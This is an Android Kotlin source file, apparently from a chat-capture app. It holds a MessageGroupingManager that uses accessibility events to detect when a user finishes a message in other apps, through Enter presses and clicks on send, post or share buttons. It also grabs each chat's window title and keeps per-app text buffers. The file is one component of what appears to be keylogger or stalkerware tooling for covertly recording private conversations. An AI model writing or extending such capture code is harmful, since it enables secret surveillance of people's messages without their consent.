package com.chats.capture.utils

import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import timber.log.Timber

/**
 * Manages message grouping logic - detects when a message is complete
 * using Enter key detection (primary) and timeout fallback.
 */
class MessageGroupingManager(private val messageBuffer: MessageBuffer) {
    
    companion object {
        private const val ENTER_KEY_CODE = 66 // KeyEvent.KEYCODE_ENTER
        private const val MESSAGE_TIMEOUT_MS = 5000L // 5 seconds
    }
    
    /**
     * Check if Enter key was pressed (for message completion)
     * This is detected via text selection change or button click
     */
    fun isEnterKeyPressed(event: AccessibilityEvent): Boolean {
        // Check if this is a text selection change that might indicate Enter
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            // Enter key typically causes cursor to move to new line or end
            return true
        }
        
        // Check if a "Send" button was clicked
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val source = event.source ?: return false
            val buttonText = source.text?.toString()?.lowercase() ?: ""
            val contentDescription = source.contentDescription?.toString()?.lowercase() ?: ""
            
            // Common send button texts
            val sendKeywords = listOf("send", "submit", "post", "share", "publish")
            return sendKeywords.any { keyword ->
                buttonText.contains(keyword) || contentDescription.contains(keyword)
            }
        }
        
        return false
    }
    
    /**
     * Check if Shift+Enter was pressed (multi-line, don't complete message)
     */
    fun isMultiLineInput(event: AccessibilityEvent): Boolean {
        // This is harder to detect via accessibility events
        // We'll rely on text containing newlines as indicator
        val text = event.text?.firstOrNull()?.toString() ?: ""
        return text.contains("\n") && text.lines().size > 1
    }
    
    /**
     * Extract chat identifier from event
     */
    fun extractChatIdentifier(event: AccessibilityEvent): String? {
        return try {
            val source = event.source ?: return null
            val windowTitle = source.window?.title?.toString()
            windowTitle?.takeIf { it.isNotBlank() }
        } catch (e: Exception) {
            Timber.e(e, "Error extracting chat identifier")
            null
        }
    }
    
    /**
     * Check if message should be completed based on timeout
     */
    fun shouldCompleteByTimeout(packageName: String): Boolean {
        return messageBuffer.isMessageComplete(packageName)
    }
    
    /**
     * Handle app switching - save current buffer
     */
    fun handleAppSwitch(packageName: String) {
        val buffer = messageBuffer.getBuffer(packageName)
        if (buffer != null && buffer.currentText.isNotBlank()) {
            // Buffer will be persisted automatically
            Timber.d("App switched, buffer saved for: $packageName")
        }
    }
}
